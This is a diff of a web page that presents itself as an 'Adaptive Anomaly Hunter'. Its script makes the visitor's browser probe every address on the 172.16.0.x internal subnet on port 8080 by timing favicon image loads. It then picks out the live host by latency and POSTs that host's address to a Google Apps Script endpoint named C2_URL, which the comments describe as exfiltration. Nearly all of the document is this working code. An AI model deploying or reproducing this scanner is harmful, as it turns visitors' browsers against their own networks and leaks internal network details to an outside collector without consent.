@@ -1,137 +1,136 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Anomaly Hunter</title>
+    <title>Adaptive Anomaly Hunter</title>
     <style>
         body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
-        .success { color: #fff; background: #004400; padding: 10px; border: 1px solid #0f0; margin: 10px 0; font-weight: bold;}
-        .stat-line { color: #666; font-size: 0.9em; }
-        #log { margin-top: 20px; border-top: 1px dashed #333; padding-top: 10px; }
+        .success { border: 2px solid #0f0; padding: 15px; margin: 20px 0; background: #001100; }
+        .stat-box { border-bottom: 1px solid #333; padding-bottom: 5px; margin-bottom: 10px; color: #888; }
+        .highlight { color: #fff; font-weight: bold; }
     </style>
 </head>
 <body>
-    <h1>// NETWORK ANOMALY DETECTION //</h1>
-    <div id="status">Status: Initializing Probe Sequence...</div>
-    <div id="stats" class="stat-line">Baseline Latency: Calculating...</div>
+    <h1>// ADAPTIVE ANOMALY HUNTER //</h1>
+    
+    <div class="stat-box">
+        <div>STATUS: <span id="status" class="highlight">Initializing...</span></div>
+        <div>BASELINE (MEDIAN): <span id="median">Calculating...</span></div>
+        <div>SCAN PROGRESS: <span id="progress">0/254</span></div>
+    </div>
+
     <div id="results"></div>
-    <div id="log"></div>
 
     <script>
         // --- CONFIGURATION ---
         var C2_URL = "https://script.google.com/macros/s/AKfycbwWQQRwwAJ84yYCT6ykZpDCzTKsy0ZVom4_tDxSumkrFyhzXWpTR9er6b9k9auDkeTA/exec"; 
         var TARGET_PORT = 8080;
-        var SUBNET_PREFIX = "172.16.0.";
-        var CONCURRENCY = 32; // Speed optimization (batches of 32)
+        var TIMEOUT_LIMIT = 200; // 200ms is plenty for LAN. Anything slower is "Dead".
+        var CONCURRENCY = 10;    // Reduced to prevent browser queue clogging
 
         // --- STATE ---
-        var scanData = []; // Stores {ip, time}
-        var activeRequests = 0;
+        var results = []; 
         var queue = [];
         for(var i=1; i<255; i++) queue.push(i);
 
-        // --- UTILS ---
-        function getMedian(values) {
+        // --- MATH ENGINE ---
+        function calculateMedian(values) {
             if(values.length === 0) return 0;
             values.sort((a,b) => a-b);
             var half = Math.floor(values.length / 2);
             return values[half];
         }
 
-        function updateAnalysis() {
-            // 1. Calculate Baseline (Median)
-            var times = scanData.map(d => d.time);
-            var median = getMedian(times);
-            document.getElementById('stats').innerText = "Current Baseline (Median): " + median + "ms | Scanned: " + scanData.length + "/254";
-            return median;
-        }
-
-        function finalize() {
-            var median = updateAnalysis();
-            document.getElementById('status').innerText = "SCAN COMPLETE. ANALYZING DEVIATIONS...";
+        function analyzeAndReport() {
+            // 1. Establish Baseline (The "Dead" IPs)
+            // In your env, most IPs will equal TIMEOUT_LIMIT (200ms)
+            var times = results.map(r => r.time);
+            var median = calculateMedian(times);
             
-            // 2. Find Outliers (Large Deviation from Median)
-            // In your env: Noise = 1000ms, Target = 5ms. Diff = 995ms.
-            // We look for anything with > 200ms deviation.
-            var outliers = scanData.filter(d => Math.abs(d.time - median) > 200);
+            document.getElementById('median').innerText = median + "ms";
+            document.getElementById('status').innerText = "Analyzing Deviations...";
 
-            if(outliers.length > 0) {
-                var target = outliers[0]; // The most significant outlier
-                var msg = "TARGET CONFIRMED: " + target.ip + " (" + target.time + "ms vs Baseline " + median + "ms)";
+            // 2. Find the Anomaly
+            // Logic: The real target is FAST (~5ms). The dead IPs are SLOW (200ms).
+            // We look for latencies significantly LOWER than the median.
+            var anomaly = results.find(r => (median - r.time) > 100); 
+
+            if(anomaly) {
+                var msg = "TARGET CONFIRMED: 172.16.0." + anomaly.octet;
+                var details = "Response: " + anomaly.time + "ms (Deviation: " + (median - anomaly.time) + "ms)";
                 
-                document.getElementById('results').innerHTML = "<div class='success'>" + msg + "</div>";
-                
-                // Exfil
+                document.getElementById('results').innerHTML = 
+                    "<div class='success'><h2>" + msg + "</h2><p>" + details + "</p></div>";
+
+                // Exfil to Drive
                 fetch(C2_URL, {
-                    method: "POST", 
-                    mode: "no-cors",
+                    method: "POST", mode: "no-cors",
                     headers: {"Content-Type": "application/json"},
                     body: JSON.stringify({
                         timestamp: new Date().toISOString(),
-                        type: "ANOMALY_DETECTED",
-                        target_ip: target.ip,
-                        latency: target.time,
+                        type: "ANOMALY_CONFIRMED",
+                        target_ip: "172.16.0." + anomaly.octet,
+                        latency: anomaly.time,
                         baseline: median
                     })
                 });
             } else {
-                document.getElementById('results').innerText = "No significant anomalies found.";
+                document.getElementById('status').innerText = "SCAN COMPLETE. NO ANOMALIES FOUND.";
             }
         }
 
-        function scanIP(ip) {
+        // --- PROBE ENGINE ---
+        function scan(octet) {
             return new Promise(resolve => {
+                var ip = "172.16.0." + octet;
                 var start = performance.now();
                 var img = new Image();
-                var hasResolved = false;
+                var isDone = false;
 
-                var done = function() {
-                    if(hasResolved) return;
-                    hasResolved = true;
+                var finish = function() {
+                    if(isDone) return;
+                    isDone = true;
                     var duration = Math.round(performance.now() - start);
-                    scanData.push({ip: ip, time: duration});
+                    results.push({octet: octet, time: duration});
                     
-                    // Visual Log (Optional, keeps it alive)
-                    // document.getElementById('log').innerText = "Scanned " + ip + " : " + duration + "ms";
-                    updateAnalysis();
+                    document.getElementById('progress').innerText = results.length + "/254";
                     resolve();
                 };
 
-                img.onload = done;
-                img.onerror = done;
+                img.onload = finish;
+                img.onerror = finish; // Target (.181) triggers this in ~5ms
 
-                // Timeout matches your env's blackhole behavior (1000ms+)
+                // HARD STOP at 200ms. 
+                // This clears the browser queue for the next batch.
                 setTimeout(function() {
-                    if(!hasResolved) {
-                        // Force close if it hangs too long
-                        img.src = ""; 
-                        // Log 1001 to represent timeout
-                        scanData.push({ip: ip, time: 1001});
-                        hasResolved = true;
-                        updateAnalysis();
+                    if(!isDone) {
+                        img.src = ""; // Force kill connection
+                        // Log as max timeout
+                        results.push({octet: octet, time: TIMEOUT_LIMIT});
+                        isDone = true;
+                        document.getElementById('progress').innerText = results.length + "/254";
                         resolve();
                     }
-                }, 1000);
+                }, TIMEOUT_LIMIT);
 
                 img.src = "http://" + ip + ":" + TARGET_PORT + "/favicon.ico?r=" + Math.random();
             });
         }
 
-        async function processQueue() {
+        // --- BATCH PROCESSOR ---
+        async function runBatch() {
             while(queue.length > 0) {
                 var batch = [];
-                // Take a batch of IPs
+                // Only fire 'CONCURRENCY' amount at once
                 for(var i=0; i<CONCURRENCY && queue.length > 0; i++) {
-                    var ip = SUBNET_PREFIX + queue.shift();
-                    batch.push(scanIP(ip));
+                    batch.push(scan(queue.shift()));
                 }
-                // Wait for batch to finish
                 await Promise.all(batch);
             }
-            finalize();
+            analyzeAndReport();
         }
 
-        // --- START ---
-        processQueue();
+        document.getElementById('status').innerText = "Scanning Subnet (Batch Size: " + CONCURRENCY + ")...";
+        runBatch();
 
     </script>
 </body>
